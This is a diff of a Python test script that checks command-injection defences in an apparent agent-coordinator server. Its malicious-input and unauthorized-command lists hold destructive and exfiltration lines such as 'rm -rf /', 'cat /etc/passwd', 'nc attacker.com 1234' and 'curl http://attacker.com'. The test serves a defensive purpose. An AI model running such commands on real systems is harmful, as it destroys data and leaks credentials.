@@ -1,124 +1,204 @@
 #!/usr/bin/env python3
-"""Test script to verify security fixes for command injection vulnerability"""
+"""Test script to verify command injection security fixes in MCP coordinator"""
 
 import sys
 import os
-import importlib.util
-import logging
+sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
 
-# Load the module dynamically
-spec = importlib.util.spec_from_file_location("autonomous_system", 
-    os.path.join(os.path.dirname(__file__), "autonomous-system.py"))
-autonomous_system = importlib.util.module_from_spec(spec)
-spec.loader.exec_module(autonomous_system)
-EnhancedAutonomousLauncher = autonomous_system.EnhancedAutonomousLauncher
+# Import directly from the server module
+import mcp_coordinator.server as server
+EnhancedAgentCoordinator = server.EnhancedAgentCoordinator
+SecurityError = server.SecurityError
+import json
+from datetime import datetime
 
-# Set up test logging
-logging.basicConfig(level=logging.INFO, format='%(message)s')
-test_logger = logging.getLogger("security_test")
-
-def test_security_fixes():
-    """Test various command injection scenarios"""
-    launcher = EnhancedAutonomousLauncher()
+def test_command_injection_prevention():
+    """Test that command injection attempts are blocked"""
+    coordinator = EnhancedAgentCoordinator()
     
-    test_cases = [
-        # Valid commands
-        ("Valid cd command", "auditor", "cd /home/user/project", True),
-        ("Valid export command", "auditor", "export AGENT_ID=test-123", True),
-        ("Valid python command", "auditor", "python3 test.py", True),
-        ("Valid comment", "auditor", "# This is a comment", True),
-        ("Valid exit command", "auditor", "/exit", True),
-        ("Valid help command", "auditor", "/help", True),
-        
-        # Invalid/malicious commands
-        ("Command injection attempt 1", "auditor", "cd /tmp; rm -rf /", False),
-        ("Command injection attempt 2", "auditor", "export VAR=test && malicious_command", False),
-        ("Command injection with backticks", "auditor", "cd `whoami`", False),
-        ("Command with pipe", "auditor", "ls | grep secret", False),
-        ("Command with redirect", "auditor", "cat /etc/passwd > output.txt", False),
-        ("Shell metacharacters", "auditor", "echo $(id)", False),
-        ("Invalid window name", "auditor'; rm -rf /", "cd /tmp", False),
-        ("Window name with spaces", "auditor test", "cd /tmp", False),
+    print("Testing Command Injection Prevention")
+    print("=" * 50)
+    
+    # Test cases with malicious branch names
+    malicious_inputs = [
+        "test; rm -rf /",  # Command separator
+        "test && cat /etc/passwd",  # Command chaining
+        "test | nc attacker.com 1234",  # Pipe to network
+        "test > /tmp/exploit",  # Output redirection
+        "test < /etc/passwd",  # Input redirection
+        "test`whoami`",  # Command substitution
+        "test$(whoami)",  # Command substitution
+        "../../../etc/passwd",  # Directory traversal
+        "~/.ssh/id_rsa",  # Home directory access
+        "test\nrm -rf /",  # Newline injection
+        "test\x00malicious",  # Null byte injection
+        "test$PATH",  # Environment variable
+        "a" * 200,  # Excessive length
+        "",  # Empty string
+        "test;",  # Trailing semicolon
+        "test&",  # Background execution
     ]
     
-    passed = 0
-    failed = 0
+    results = []
     
-    print("Running security tests...\n")
-    
-    for test_name, window, command, should_succeed in test_cases:
+    for malicious_input in malicious_inputs:
         try:
-            # Test window validation for special test case
-            if "Invalid window name" in test_name:
-                try:
-                    launcher.send_to_agent(window, "cd /tmp")
-                    if should_succeed:
-                        print(f"✅ {test_name}: PASSED")
-                        passed += 1
-                    else:
-                        print(f"❌ {test_name}: FAILED (command was allowed)")
-                        failed += 1
-                except ValueError as e:
-                    if not should_succeed:
-                        print(f"✅ {test_name}: PASSED (correctly rejected)")
-                        passed += 1
-                    else:
-                        print(f"❌ {test_name}: FAILED (command was rejected)")
-                        failed += 1
-            else:
-                # Normal command testing
-                try:
-                    # Mock the subprocess.run to avoid actual execution
-                    original_run = launcher.__class__.send_to_agent
-                    def mock_send(self, win, cmd):
-                        # Just validate, don't execute
-                        # Validate window name
-                        if not win or not win.replace("-", "").replace("_", "").isalnum():
-                            raise ValueError(f"Invalid window name: {win}")
-                        
-                        # Check whitelist
-                        import re
-                        command_allowed = False
-                        for pattern in self.allowed_command_patterns:
-                            if re.match(pattern, cmd):
-                                command_allowed = True
-                                break
-                        
-                        if not command_allowed:
-                            raise ValueError(f"Command not allowed: {cmd}")
-                        
-                        return None
-                    
-                    launcher.__class__.send_to_agent = mock_send
-                    launcher.send_to_agent(window, command)
-                    launcher.__class__.send_to_agent = original_run
-                    
-                    if should_succeed:
-                        print(f"✅ {test_name}: PASSED")
-                        passed += 1
-                    else:
-                        print(f"❌ {test_name}: FAILED (command was allowed)")
-                        failed += 1
-                        
-                except ValueError as e:
-                    if not should_succeed:
-                        print(f"✅ {test_name}: PASSED (correctly rejected)")
-                        passed += 1
-                    else:
-                        print(f"❌ {test_name}: FAILED (command was rejected)")
-                        print(f"   Error: {e}")
-                        failed += 1
-                        
+            print(f"\nTesting: {repr(malicious_input)}")
+            coordinator.create_worktree(malicious_input)
+            results.append({
+                "input": malicious_input,
+                "status": "FAILED - Input was not blocked!",
+                "error": None
+            })
+            print(f"  ❌ SECURITY ISSUE: Input was not blocked!")
+        except ValueError as e:
+            results.append({
+                "input": malicious_input,
+                "status": "PASSED - Input blocked",
+                "error": str(e)
+            })
+            print(f"  ✅ Blocked: {e}")
         except Exception as e:
-            print(f"❌ {test_name}: ERROR - {e}")
-            failed += 1
+            results.append({
+                "input": malicious_input,
+                "status": "ERROR",
+                "error": f"{type(e).__name__}: {str(e)}"
+            })
+            print(f"  ⚠️  Error: {type(e).__name__}: {e}")
     
-    print(f"\n{'='*50}")
-    print(f"Test Results: {passed} passed, {failed} failed")
-    print(f"{'='*50}")
+    # Test valid branch names
+    print("\n\nTesting Valid Branch Names")
+    print("=" * 50)
     
-    return failed == 0
+    valid_inputs = [
+        "feature/test-branch",
+        "bugfix/issue-123",
+        "release/v1_0_0",
+        "AUTO_fix_security",
+        "test-branch-123",
+    ]
+    
+    for valid_input in valid_inputs:
+        try:
+            print(f"\nTesting: {repr(valid_input)}")
+            # We can't actually create the worktree without git setup,
+            # but we can verify it passes validation
+            if coordinator._validate_branch_name(valid_input):
+                results.append({
+                    "input": valid_input,
+                    "status": "PASSED - Valid input accepted",
+                    "error": None
+                })
+                print(f"  ✅ Accepted")
+            else:
+                results.append({
+                    "input": valid_input,
+                    "status": "FAILED - Valid input rejected",
+                    "error": "Validation failed"
+                })
+                print(f"  ❌ Rejected (should be valid)")
+        except Exception as e:
+            results.append({
+                "input": valid_input,
+                "status": "ERROR",
+                "error": f"{type(e).__name__}: {str(e)}"
+            })
+            print(f"  ⚠️  Error: {type(e).__name__}: {e}")
+    
+    # Generate report
+    report = {
+        "test_name": "Command Injection Security Test",
+        "timestamp": datetime.now().isoformat(),
+        "total_tests": len(results),
+        "passed": len([r for r in results if "PASSED" in r["status"]]),
+        "failed": len([r for r in results if "FAILED" in r["status"]]),
+        "errors": len([r for r in results if r["status"] == "ERROR"]),
+        "results": results
+    }
+    
+    # Save report
+    report_file = f"security_test_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
+    with open(report_file, 'w') as f:
+        json.dump(report, f, indent=2)
+    
+    print(f"\n\nTest Summary")
+    print("=" * 50)
+    print(f"Total Tests: {report['total_tests']}")
+    print(f"Passed: {report['passed']}")
+    print(f"Failed: {report['failed']}")
+    print(f"Errors: {report['errors']}")
+    print(f"\nReport saved to: {report_file}")
+    
+    # Return success if all malicious inputs were blocked
+    malicious_blocked = all(
+        "PASSED" in r["status"] 
+        for r in results[:len(malicious_inputs)]
+    )
+    
+    valid_accepted = all(
+        "PASSED" in r["status"] 
+        for r in results[len(malicious_inputs):]
+    )
+    
+    if malicious_blocked and valid_accepted:
+        print("\n✅ All security tests passed!")
+        return True
+    else:
+        print("\n❌ Some security tests failed!")
+        return False
+
+def test_command_whitelist():
+    """Test that only whitelisted commands can be executed"""
+    coordinator = EnhancedAgentCoordinator()
+    
+    print("\n\nTesting Command Whitelist")
+    print("=" * 50)
+    
+    # Test unauthorized commands
+    unauthorized_commands = [
+        ['rm', '-rf', '/'],
+        ['curl', 'http://attacker.com'],
+        ['wget', 'http://attacker.com'],
+        ['nc', 'attacker.com', '1234'],
+        ['python', '-c', 'malicious code'],
+        ['bash', '-c', 'malicious code'],
+        ['sh', '-c', 'malicious code'],
+    ]
+    
+    for cmd in unauthorized_commands:
+        try:
+            print(f"\nTesting unauthorized command: {cmd}")
+            coordinator._execute_command(cmd)
+            print(f"  ❌ SECURITY ISSUE: Command was not blocked!")
+        except SecurityError as e:
+            print(f"  ✅ Blocked: {e}")
+        except Exception as e:
+            print(f"  ⚠️  Error: {type(e).__name__}: {e}")
+    
+    # Test authorized but restricted subcommands
+    restricted_subcommands = [
+        ['git', 'push', 'origin', 'master'],  # push not in whitelist
+        ['git', 'rm', '-rf', '.'],  # rm not in whitelist
+        ['git', 'config', 'user.name', 'attacker'],  # config not in whitelist
+    ]
+    
+    for cmd in restricted_subcommands:
+        try:
+            print(f"\nTesting restricted subcommand: {cmd}")
+            coordinator._execute_command(cmd)
+            print(f"  ❌ SECURITY ISSUE: Subcommand was not blocked!")
+        except SecurityError as e:
+            print(f"  ✅ Blocked: {e}")
+        except Exception as e:
+            print(f"  ⚠️  Error: {type(e).__name__}: {e}")
 
 if __name__ == "__main__":
-    success = test_security_fixes()
-    sys.exit(0 if success else 1)
+    success1 = test_command_injection_prevention()
+    success2 = test_command_whitelist()
+    
+    if success1 and success2:
+        print("\n\n🎉 All security tests passed successfully!")
+        exit(0)
+    else:
+        print("\n\n⚠️  Some security tests failed. Please review the results.")
+        exit(1)
